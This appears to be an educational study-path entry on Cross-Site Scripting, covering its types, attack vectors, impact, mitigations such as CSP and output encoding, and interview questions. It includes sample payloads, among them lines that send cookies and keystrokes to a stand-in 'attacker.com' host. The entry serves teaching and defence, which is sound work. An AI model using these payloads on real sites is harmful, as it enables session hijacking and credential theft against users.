# XSS

## Definition
Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious client-side scripts into web pages viewed by other users. When the victim's browser renders the injected script, it executes in the context of the vulnerable web application, enabling the attacker to steal cookies, session tokens, credentials, redirect users, deface pages, or perform actions on behalf of the victim.

## Why It Matters
XSS is one of the most common web vulnerabilities — present in approximately 80% of web applications according to various studies. It consistently ranks in the OWASP Top 10. XSS can lead to complete account takeover, data theft, malware distribution (via drive-by downloads), and is often used as a vector for more severe attacks (CSRF bypass, phishing). Understanding XSS is essential for web developers, penetration testers, and security analysts.

## Where It Appears in the Path
XSS is covered in the web security module. It builds on understanding HTTP, HTML, JavaScript, and the Same-Origin Policy. XSS knowledge is prerequisite for advanced web attacks, Content Security Policy (CSP) configuration, and web application penetration testing.

## Prerequisites
- Web application fundamentals (HTTP, HTML, JavaScript)
- Same-Origin Policy understanding
- Basic understanding of cookies and sessions

## Types of XSS

### Reflected XSS (Non-Persistent)
The injected script is reflected off the web server immediately, typically via a crafted URL or form submission. The victim must click a malicious link. The payload is not stored on the server.
```
https://example.com/search?q=<script>alert('XSS')</script>
```
Common delivery: phishing emails with malicious links, social engineering.

### Stored XSS (Persistent)
The injected script is permanently stored on the server (database, comment field, forum post, user profile). Every user who visits the affected page will execute the script. Most dangerous type — can infect thousands of users without individual targeting.
```
Comment: <script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>
```

### DOM-Based XSS
The vulnerability exists in client-side JavaScript code rather than server-side. The script modifies the DOM dynamically based on user input without the server's involvement. The page itself doesn't change — the browser executes the malicious script due to unsafe handling of the URL fragment or other client-side data sources.
```javascript
var name = document.location.hash.substring(1);
document.getElementById('welcome').innerHTML = name;  // Unsafe: inserts user input as HTML
```

## XSS Attack Vectors
- **HTML Context**: `<tag>` — inject `<script>`, `<img onerror>`, `<svg onload>`
- **Attribute Context**: `<input value="...">` — break out with `">`, inject `onfocus=...`
- **JavaScript Context**: `var msg = '...';` — break with `'; alert(1);'`
- **CSS Context**: `<style>` tags — `background: url(javascript:...)` (older browsers) 
- **URL Context**: `href="javascript:..."` — use `javascript:` protocol

## Common Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<a href="javascript:alert(1)">Click me</a>
```

### Cookie Theft
```html
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

### Keylogging
```html
<script>document.onkeypress=function(e){fetch('https://attacker.com/k?k='+e.key)}</script>
```

### Defacement
```html
<script>document.body.innerHTML='<h1>Hacked!</h1>'</script>
```

## Impact
- **Session hijacking**: Steal session cookies and impersonate the victim.
- **Credential theft**: Fake login forms that capture usernames/passwords.
- **Account takeover**: Execute actions as the victim (CSRF-like without tokens).
- **Port scanning / internal network attacks**: JavaScript can probe internal IPs.
- **Drive-by download**: Force browser to download malware (requires other vulns).
- **Cryptocurrency mining**: Run Monero miners in the victim's browser.
- **Phishing**: Display fake login forms overlaying the real page.

## Mitigation

### Content Security Policy (CSP)
The most effective modern defense. CSP is a browser header that restricts which scripts can execute:
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```
A strict CSP prevents inline scripts (`<script>`, `onclick`, `javascript:`) and limits script sources. CSP nonces/hashes can allow specific inline scripts.

### Input Validation & Output Encoding
- **HTML Entity Encoding**: `< → &lt;`, `> → &gt;`, `" → &quot;`, `' → &#x27;`, `& → &amp;`
- **Context-Specific Encoding**: HTML body, HTML attributes, JavaScript strings, CSS, URLs each require different encoding schemes.
- **Framework auto-escaping**: React (JSX), Angular, Vue automatically escape content in templates. Template engines like Jinja2, Twig, or EJS with auto-escaping.
- **NEVER**: `document.innerHTML`, `document.write`, `eval()`, `$(...)` with unsanitized user input.

### XSS Filters (Legacy)
Browsers once had built-in XSS filters (X-XSS-Protection header). Modern browsers deprecated them in favor of CSP. Do not rely on these.

### HttpOnly Cookies
Mark session cookies as `HttpOnly` — prevents JavaScript from accessing `document.cookie`. Doesn't prevent XSS but protects session tokens from cookie theft.

## Common Interview Questions
1. **What is XSS and what are the three types?** Cross-Site Scripting — injecting scripts into web pages. Types: Reflected (non-persistent, in URL), Stored (persistent, in database), DOM-based (client-side only).
2. **What is the difference between Reflected and Stored XSS?** Reflected payload comes from request (URL), stored payload is stored on the server. Stored is more dangerous (affects all visitors).
3. **How does Content Security Policy (CSP) prevent XSS?** CSP restricts script sources, disables inline scripts, and controls other resource loading. A strict CSP prevents most XSS attacks.
4. **What is the difference between Server-Side XSS and Client-Side XSS?** Server-side XSS: server generates HTML with unsafe user input. Client-side XSS (DOM-based): client-side JavaScript unsafely handles user input (URL fragment, postMessage, etc.).
5. **How would you steal cookies via XSS?** `fetch('https://attacker.com/?c='+document.cookie)` or `new Image().src='...'`. Mitigated by HttpOnly flag on cookies.
6. **What is the difference between XSS and CSRF?** XSS executes scripts in the user's browser from the vulnerable site. CSRF forges requests from an external site to the vulnerable site. XSS can bypass CSRF protections.

## Further Reading
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Testing Guide for XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.html)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- TryHackMe: XSS room
